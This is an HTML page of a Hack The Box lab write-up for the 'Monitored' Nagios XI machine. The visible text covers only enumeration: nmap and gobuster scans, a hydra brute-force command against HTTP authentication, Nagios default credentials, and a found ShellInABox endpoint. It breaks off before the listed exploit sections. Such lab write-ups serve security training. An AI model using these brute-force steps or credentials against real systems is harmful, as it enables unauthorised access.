<!doctype html><html lang=en dir=ltr class=scroll-smooth data-default-appearance=dark data-auto-appearance=true><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><meta name=theme-color content="#FFFFFF"><title>HTB Monitored &#183; cruxqsec</title><meta name=title content="HTB Monitored &#183; cruxqsec"><script type=text/javascript src=https://cruxqsec.github.io/js/appearance.min.8a082f81b27f3cb2ee528df0b0bdc39787034cf2cc34d4669fbc9977c929023c.js integrity="sha256-iggvgbJ/PLLuUo3wsL3Dl4cDTPLMNNRmn7yZd8kpAjw="></script><link type=text/css rel=stylesheet href=https://cruxqsec.github.io/css/main.bundle.min.73a66927c7acc72723529fdbfb83896b6508866b0394738cd5b0222b98c06aec.css integrity="sha256-c6ZpJ8esxycjUp/b+4OJa2UIhmsDlHOM1bAiK5jAauw="><script defer type=text/javascript id=script-bundle src=https://cruxqsec.github.io/js/main.bundle.min.d97ddc5ab27d9f764a39a1e9c14f27b5583e3d47287e6278766921e42cb09f55.js integrity="sha256-2X3cWrJ9n3ZKOaHpwU8ntVg+PUcofmJ4dmkh5Cywn1U=" data-copy=Copy data-copied=Copied></script><meta name=description content="
      Medium difficulty Linux machine from Hack the box
    "><link rel=canonical href=https://cruxqsec.github.io/writeups/htb-monitored/><link rel=apple-touch-icon sizes=180x180 href=/apple-touch-icon.png><link rel=icon type=image/png sizes=32x32 href=/favicon-32x32.png><link rel=icon type=image/png sizes=16x16 href=/favicon-16x16.png><link rel=manifest href=/site.webmanifest><meta property="og:url" content="https://cruxqsec.github.io/writeups/htb-monitored/"><meta property="og:site_name" content="cruxqsec"><meta property="og:title" content="HTB Monitored"><meta property="og:description" content="Medium difficulty Linux machine from Hack the box"><meta property="og:locale" content="en"><meta property="og:type" content="article"><meta property="article:section" content="writeups"><meta property="article:published_time" content="2024-05-14T00:00:00+00:00"><meta property="article:modified_time" content="2024-05-14T00:00:00+00:00"><meta property="article:tag" content="htb"><meta property="article:tag" content="linux"><meta property="article:tag" content="snmp"><meta property="article:tag" content="sql-injection"><meta property="article:tag" content="cve"><meta property="og:image" content="https://cruxqsec.github.io/writeups/htb-monitored/feature.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://cruxqsec.github.io/writeups/htb-monitored/feature.png"><meta name=twitter:title content="HTB Monitored"><meta name=twitter:description content="Medium difficulty Linux machine from Hack the box"><script type=application/ld+json>{"@context":"https://schema.org","@type":"Article","articleSection":"","name":"HTB Monitored","headline":"HTB Monitored","description":"Medium difficulty Linux machine from Hack the box","abstract":"Medium difficulty Linux machine from Hack the box","inLanguage":"en","url":"https:\/\/cruxqsec.github.io\/writeups\/htb-monitored\/","author":{"@type":"Person","name":"cruxqsec"},"copyrightYear":"2024","dateCreated":"2024-05-14T00:00:00\u002b00:00","datePublished":"2024-05-14T00:00:00\u002b00:00","dateModified":"2024-05-14T00:00:00\u002b00:00","keywords":["htb","linux","snmp","sql-injection","cve"],"mainEntityOfPage":"true","wordCount":"1612"}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","item":"https://cruxqsec.github.io/","name":"Cruxqsec","position":1},{"@type":"ListItem","item":"https://cruxqsec.github.io/writeups/","name":"","position":2},{"@type":"ListItem","name":"Htb monitored","position":3}]}</script><meta name=author content="cruxqsec"><link href=https://github.com/cruxqsec rel=me><link href=https://app.hackthebox.com/public/users/157126 rel=me><link href=mailto:cruxqsec@proton.me rel=me></head><body class="m-auto flex h-screen max-w-7xl flex-col bg-neutral px-6 text-lg leading-7 text-neutral-900 dark:bg-neutral-800 dark:text-neutral sm:px-14 md:px-24 lg:px-32"><div id=the-top class="absolute flex self-center"><a class="-translate-y-8 rounded-b-lg bg-primary-200 px-3 py-1 text-sm focus:translate-y-0 dark:bg-neutral-600" href=#main-content><span class="pe-2 font-bold text-primary-600 dark:text-primary-400">&darr;</span>Skip to main content</a></div><header class="py-6 font-semibold text-neutral-900 dark:text-neutral sm:py-10 print:hidden"><nav class="flex items-start justify-between sm:items-center"><div class="z-40 flex flex-row items-center"><a href=/ class=mr-2><img src=https://cruxqsec.github.io/logo.png width=704 height=368 class="max-h-[10rem] max-w-[10rem] object-scale-down object-left
dark:hidden flex" alt=cruxqsec>
<img src=https://cruxqsec.github.io/logo.png width=704 height=368 class="hidden max-h-[10rem] max-w-[10rem] object-scale-down object-left dark:flex" alt=cruxqsec></a></div><label id=menu-button for=menu-controller class="block sm:hidden"><input type=checkbox id=menu-controller class=hidden><div class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 448 512"><path fill="currentColor" d="M0 96C0 78.33 14.33 64 32 64H416c17.7.0 32 14.33 32 32 0 17.7-14.3 32-32 32H32C14.33 128 0 113.7.0 96zM0 256c0-17.7 14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32H32c-17.67.0-32-14.3-32-32zM416 448H32c-17.67.0-32-14.3-32-32s14.33-32 32-32H416c17.7.0 32 14.3 32 32s-14.3 32-32 32z"/></svg></span></div><div id=menu-wrapper class="invisible fixed inset-0 z-30 m-auto h-full w-full cursor-default overflow-auto bg-neutral-100/50 opacity-0 backdrop-blur-sm transition-opacity dark:bg-neutral-900/50"><ul class="mx-auto flex w-full max-w-7xl list-none flex-col overflow-visible px-6 py-6 text-end sm:px-14 sm:py-10 sm:pt-10 md:px-24 lg:px-32"><li class=mb-1><span class="cursor-pointer hover:text-primary-600 dark:hover:text-primary-400"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75.0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3 54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75.0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75.0-45.25s32.75-12.5 45.25.0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25.0s12.5 32.75.0 45.25l-105.4 105.4L310.6 361.4z"/></svg></span></span></li><li class="group mb-1"><a href=/writeups/ title onclick=close_menu()><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Writeups</span></a></li><li class="group mb-1"><a href=/about/ title onclick=close_menu()><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">About</span></a></li><li class="group mb-1"><button id=appearance-switcher-1 type=button aria-label="appearance switcher">
<span class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden" title="Switch to dark appearance"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg>
</span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span>
</span><span class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline" title="Switch to light appearance"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg>
</span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></span></button></li><li class="group mb-1"><button id=search-button-1 title="Search (/)">
<span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></button></li></ul></div></label><ul class="hidden list-none flex-row text-end sm:flex"><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><a href=/writeups/ title><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">Writeups</span></a></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><a href=/about/ title><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2">About</span></a></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><button id=appearance-switcher-2 type=button aria-label="appearance switcher">
<span class="group-dark:hover:text-primary-400 inline transition-colors group-hover:text-primary-600 dark:hidden" title="Switch to dark appearance"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M32 256C32 132.2 132.3 32 255.8 32c11.36.0 29.7 1.668 40.9 3.746 9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3 9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480 132.1 480 32 379.6 32 256z"/></svg>
</span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span>
</span><span class="group-dark:hover:text-primary-400 hidden transition-colors group-hover:text-primary-600 dark:inline" title="Switch to light appearance"><span class="icon relative inline-block px-1 align-text-bottom"><svg viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02.0-95.1 42.98-95.1 95.1s41.2 96.9 95.1 96.9 95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347l-63.2-91.9 63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89 164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6 12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256 2.74 347.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7 19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109 109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69.0-127.1-57.31-127.1-127.1.0-70.69 57.31-127.1 127.1-127.1S383.1 186.2 383.1 256c0 70.7-56.4 127.1-127.1 127.1z"/></svg>
</span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></span></button></li><li class="group mb-1 sm:mb-0 sm:me-7 sm:last:me-0"><button id=search-button-2 title="Search (/)">
<span class="group-dark:hover:text-primary-400 transition-colors group-hover:text-primary-600"><span class="icon relative inline-block px-1 align-text-bottom"><svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7 405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9.0 208 0S0 93.1.0 208s93.1 208 208 208c48.3.0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9.0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7.0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7.0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>
</span></span><span class="decoration-primary-500 group-hover:underline group-hover:decoration-2 group-hover:underline-offset-2"></span></button></li></ul></nav></header><div class="relative flex grow flex-col"><main id=main-content class=grow><article><header class=max-w-prose><ol class="text-sm text-neutral-500 dark:text-neutral-400 print:hidden"><li class="hidden inline"><a class="dark:underline-neutral-600 decoration-neutral-300 hover:underline" href=https://cruxqsec.github.io/>cruxqsec</a><span class="px-1 text-primary-500">/</span></li><li class=inline><a class="dark:underline-neutral-600 decoration-neutral-300 hover:underline" href=https://cruxqsec.github.io/writeups/>writeups</a><span class="px-1 text-primary-500">/</span></li><li class="hidden inline"><a class="dark:underline-neutral-600 decoration-neutral-300 hover:underline" href=https://cruxqsec.github.io/writeups/htb-monitored/>HTB Monitored</a><span class="px-1 text-primary-500">/</span></li></ol><h1 class="mb-8 mt-0 text-4xl font-extrabold text-neutral-900 dark:text-neutral">HTB Monitored</h1><div class="mb-10 text-base text-neutral-500 dark:text-neutral-400 print:hidden"><div class="flex flex-row flex-wrap items-center"><time datetime="2024-05-14 00:00:00 +0000 UTC">14 May 2024</time><span class="px-2 text-primary-500">&#183;</span><span title="Reading time">8 mins</span></div><div class="my-1 flex flex-wrap text-xs leading-relaxed text-neutral-500 dark:text-neutral-400"><a href=https://cruxqsec.github.io/tags/htb/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">htb</a>
<a href=https://cruxqsec.github.io/tags/linux/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">linux</a>
<a href=https://cruxqsec.github.io/tags/snmp/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">snmp</a>
<a href=https://cruxqsec.github.io/tags/sql-injection/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">sql-injection</a>
<a href=https://cruxqsec.github.io/tags/cve/ class="mx-1 my-1 rounded-md border border-neutral-200 px-1 py-[1px] hover:border-primary-300 hover:text-primary-700 dark:border-neutral-600 dark:hover:border-primary-600 dark:hover:text-primary-400">cve</a></div></div><div class=prose><picture class="mb-6 rounded-md"><source srcset=https://cruxqsec.github.io/writeups/htb-monitored/feature_hu_5be5a3fcb4598c6f.webp sizes=100vw type=image/webp><img width=640 height=480 class="mb-6 rounded-md" src=https://cruxqsec.github.io/writeups/htb-monitored/feature.png></picture></div></header><section class="prose mt-0 flex max-w-full flex-col dark:prose-invert lg:flex-row"><div class="order-first px-0 lg:order-last lg:max-w-xs lg:ps-8"><div class="toc pe-5 lg:sticky lg:top-10 print:hidden"><details open class="-ms-5 mt-0 overflow-hidden rounded-lg ps-5"><summary class="block cursor-pointer bg-neutral-100 py-1 ps-5 text-lg font-semibold text-neutral-800 dark:bg-neutral-700 dark:text-neutral-100 lg:hidden">Table of Contents</summary><div class="border-s border-dotted border-neutral-300 py-2 ps-5 dark:border-neutral-600"><nav id=TableOfContents><ul><li><a href=#enumeration>Enumeration</a><ul><li><a href=#ldap>LDAP</a></li><li><a href=#website>Website</a></li></ul></li><li><a href=#more-enumeration>More enumeration</a><ul><li><a href=#snmp>SNMP</a></li></ul></li><li><a href=#entering-nagios>Entering Nagios</a><ul><li><a href=#exploiting-cve-2023-40931>Exploiting CVE-2023-40931</a></li><li><a href=#exploiting-the-api>Exploiting the API</a></li></ul></li><li><a href=#privilege-escalation>Privilege escalation</a></li></ul></nav></div></details></div></div><div class="min-h-0 min-w-0 max-w-prose grow"><h2 id=enumeration class="relative group">Enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#enumeration aria-label=Anchor>#</a></span></h2><p>I started out with a classic <kbd><code>nmap</code></kbd> scan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir nmap
</span></span><span class=line><span class=cl>sudo nmap -sC -sV 10.10.11.248 -oA nmap/monitored
</span></span></code></pre></div><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_94a562d49e33037d.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_786f5428884ddb44.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_b4cc0d3fccd4970b.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_25338688413415cc.webp 1248w" sizes=100vw type=image/webp><img width=1248 height=680 class="mx-auto my-0 rounded-md" alt="image 1" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_afe3fec0a15edf3b.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_a0f4ff391ef90fa3.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_afe3fec0a15edf3b.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/1_hu_acf4577046e6c156.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/1.png 1248w" sizes=100vw></picture></figure></p><p>We can see nothing special, we have SSH, web server and
<a href=https://en.wikipedia.org/wiki/Lightweight_Directory_Access_Protocol target=_blank rel=noreferrer>LDAP</a> running.</p><h3 id=ldap class="relative group">LDAP <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#ldap aria-label=Anchor>#</a></span></h3><p>Let&rsquo;s start with this. To enumerate the <code>LDAP</code> port we can use <kbd><code>nmap</code></kbd> :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nmap -n -p <span class=m>389</span> -sV --script <span class=s2>&#34;ldap* and not brute&#34;</span> 10.10.11.248
</span></span></code></pre></div><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_4cce6906c1c9e19e.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_8b5db8549d2e42ed.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_a460188bc0423aa9.webp 698w
,https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_a460188bc0423aa9.webp 698w" sizes=100vw type=image/webp><img width=698 height=917 class="mx-auto my-0 rounded-md" alt="image 2" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_3a7bb233ff2c7f11.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_41e229b133be9aa2.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/2_hu_3a7bb233ff2c7f11.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/2.png 698w
,https://cruxqsec.github.io/writeups/htb-monitored/img/2.png 698w" sizes=100vw></picture></figure></p><p>I played with <kbd><code>ldapsearch</code></kbd> but found nothing.</p><h3 id=website class="relative group">Website <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#website aria-label=Anchor>#</a></span></h3><p>I checked out the site and was redirected to <code>nagios.monitored.htb</code>.</p><p>So just add it to <code>/etc/hosts</code> and it works. I saw it&rsquo;s using <code>NagiosXI</code>.
I couldn&rsquo;t find the version but it looked recent.
I searched for any recent public vulnerabilities and found nothing that could be used
as we are still unauthenticated. I ran some more enumeration while looking around:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>gobuster dir -u https://monitored.htb/ -w /opt/SecLists/Discovery/Web-Content/raft-medium-files.txt -k
</span></span></code></pre></div><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_c2589541de9446f6.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_a79d846929ed65da.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_97e991378fbd7e12.webp 957w
,https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_97e991378fbd7e12.webp 957w" sizes=100vw type=image/webp><img width=957 height=661 class="mx-auto my-0 rounded-md" alt="image 3" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_f1c6592b4eb92e4.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_337b1e7658b1f9aa.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/3_hu_f1c6592b4eb92e4.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/3.png 957w
,https://cruxqsec.github.io/writeups/htb-monitored/img/3.png 957w" sizes=100vw></picture></figure></p><p><kbd><code>gobuster</code></kbd> finds the <code>/nagios</code> endpoint which is prompting for <code>HTTP Authentication</code>.
So I searched for some default credentials and found a few:</p><p><code>root:nagiosxi</code> can be used for the database and ssh.</p><p><code>nagiosadmin:nagiosadmin</code> is also used as a default for Nagios.</p><p>So the next logical steps is to try these on <code>/nagios</code> endpoint with <kbd><code>hydra</code></kbd> :</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>hydra -L users.txt -P passwords.txt nagios.monitored.htb https-get <span class=s2>&#34;/nagios&#34;</span>
</span></span></code></pre></div><p>The users were created from default users plus <code>admin</code> and a few others standard ones.
I used the most common 1000 passwords for the password word list plus the default credentials.
I didn&rsquo;t get a match. No easy wins unfortunately. Oh well&mldr;</p><p>Then I tried the <code>/nagiosxi</code> directory and to my surprise it exists.</p><p>So I just continued with the <kbd><code>gobuster</code></kbd> searches using different website endpoint directories and different word lists.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_e53be71ba0e61ba1.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_be9cea8076f00027.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_c0010e98cc722c2d.webp 954w
,https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_c0010e98cc722c2d.webp 954w" sizes=100vw type=image/webp><img width=954 height=907 class="mx-auto my-0 rounded-md" alt="image 4" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_a129ed5ecf6d171c.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_ae4f6878f1881e07.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/4_hu_a129ed5ecf6d171c.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/4.png 954w
,https://cruxqsec.github.io/writeups/htb-monitored/img/4.png 954w" sizes=100vw></picture></figure></p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_f9f850c8eb2e9dca.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_18a848cf49af9fc8.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_5fae5faf0cb5869f.webp 894w
,https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_5fae5faf0cb5869f.webp 894w" sizes=100vw type=image/webp><img width=894 height=792 class="mx-auto my-0 rounded-md" alt="image 5" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_836f1169668503d.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_4cdf25f43c8534a5.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/5_hu_836f1169668503d.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/5.png 894w
,https://cruxqsec.github.io/writeups/htb-monitored/img/5.png 894w" sizes=100vw></picture></figure></p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_6e2787777aa76a00.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_484fe2bcbd80404e.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_af012d3c95e80b44.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_7d9ab8a251656e23.webp 1320w" sizes=100vw type=image/webp><img width=1434 height=890 class="mx-auto my-0 rounded-md" alt="image 6" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_8bea7b250d16b6e9.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_2b80103041eddc8b.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_8bea7b250d16b6e9.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_5b7164b5aba5b626.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/6_hu_39bce17f56c13473.png 1320w" sizes=100vw></picture></figure></p><p>So after scanning <code>https://nagios.monitored.htb/nagiosxi/</code> endpoint for directories we can see some directories require that we are authenticated</p><p>But there is this this interesting directory <code>/terminal</code>.
After visiting it we see it&rsquo;s running <code>ShellInABox</code>.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_281268c61e7e7bd9.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_f7cd18a942c17ac.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_6a319dd472c2f6e3.webp 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_a59110d7b0bc3d93.webp 1195w" sizes=100vw type=image/webp><img width=1195 height=400 class="mx-auto my-0 rounded-md" alt="image 7" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_8945fe6a1db36caf.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_86e29093bb7d0ced.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_8945fe6a1db36caf.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/7_hu_7dc18c368bbcda83.png 1024w
,https://cruxqsec.github.io/writeups/htb-monitored/img/7.png 1195w" sizes=100vw></picture></figure></p><p>Its version is 2.20. I searched for any known vulnerabilities and found none.
I was a bit stuck so I backtracked a bit and tried a few other things.</p><h2 id=more-enumeration class="relative group">More enumeration <span class="absolute top-0 w-6 transition-opacity opacity-0 -start-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style=text-decoration-line:none!important href=#more-enumeration aria-label=Anchor>#</a></span></h2><p>It did a <kbd><code>nmap</code></kbd> UPD scan with</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo nmap -sU 10.10.11.248
</span></span></code></pre></div><p>While that was running I searched for a way to discover the <code>NagiosXI</code> version
and also tried some hand fuzzing of and <code>HTTP GET</code> parameters and such.
When the scan returned I found something interesting.</p><p><figure><picture class="mx-auto my-0 rounded-md"><source srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_175f22c8398a038d.webp 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_5a4f46103b2be197.webp 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_65b27e196480bd8f.webp 726w
,https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_65b27e196480bd8f.webp 726w" sizes=100vw type=image/webp><img width=726 height=398 class="mx-auto my-0 rounded-md" alt="image 8" loading=lazy decoding=async src=https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_8253e19f1171f219.png srcset="https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_8acead34bcde5c54.png 330w,https://cruxqsec.github.io/writeups/htb-monitored/img/8_hu_8253e19f1171f219.png 660w
,https://cruxqsec.github.io/writeups/htb-monitored/img/8.png 726w
